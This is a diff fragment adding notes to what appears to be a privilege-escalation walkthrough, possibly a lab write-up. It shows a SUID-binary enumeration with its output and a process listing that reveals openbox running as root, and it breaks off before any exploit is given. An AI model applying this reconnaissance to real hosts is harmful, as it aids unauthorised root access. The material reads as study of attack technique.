@@ -23,3 +23,21 @@
 </window>
 
 # Rub it using browser irc://myhost -f /home/guest/terminal
+
+# Now we can run custom commands on the server-> ls -al /tmp
+# For exploitation we need to find suid binary> find / -perm -u=s -exec ls -al {} +
+
+-r-sr-xr-x    1 root     root        101787 Sep  7  2019 /opt/Citrix/ICAClient/ctxusb
+-rws--x--x    1 root     root         27384 Apr 30  2020 /sbin/mount.vboxsf
+-rws--x--x    1 root     root         14456 Feb  9  2020 /usr/bin/vmware-user-suid-wrapper
+-rws--x--x    1 root     bin        1560160 Jul 13  2017 /usr/bin/xlock
+-rws--x--x    1 root     root        396000 Sep 14  2019 /usr/lib64/misc/ssh-keysign
+-rws--x--x    1 root     root         67128 Dec 29  2016 /usr/sbin/mtr
+-r-s--x--x    1 root     root        339544 Mar 29  2019 /usr/sbin/pppd
+
+# None of them has exploits available. Lets try with another approach looking process
+ps aux 
+
+1196 root       0:01 /usr/bin/openbox --startup /usr/libexec/openbox-autostart OPENBOX
+
+We can see openbox is running with root. Openbox supports a command-line option
